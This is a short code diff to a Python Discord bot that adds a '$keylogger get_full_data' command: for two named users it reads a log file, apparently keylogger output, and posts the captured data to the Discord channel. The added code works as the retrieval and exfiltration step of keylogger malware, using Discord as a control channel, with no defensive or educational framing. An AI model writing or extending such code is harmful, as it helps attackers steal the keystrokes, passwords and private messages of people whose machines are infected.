@@ -27,4 +27,12 @@ class DiscordBot:
                 else:
                     await message.channel.send("this is not for you love 😘")
 
+            if message.content.startswith('$keylogger get_full_data'):
+                if str(message.author)=='async_sunlight' or str(message.author)=='san3507':
+                    content=open(filename,'r').readlines()
+                    await message.channel.send(f"New logged data is : ```{content}```")
+
+                else:
+                    await message.channel.send("this is not for you love 😘")
+
         client.run(str(os.getenv('TOKEN')))
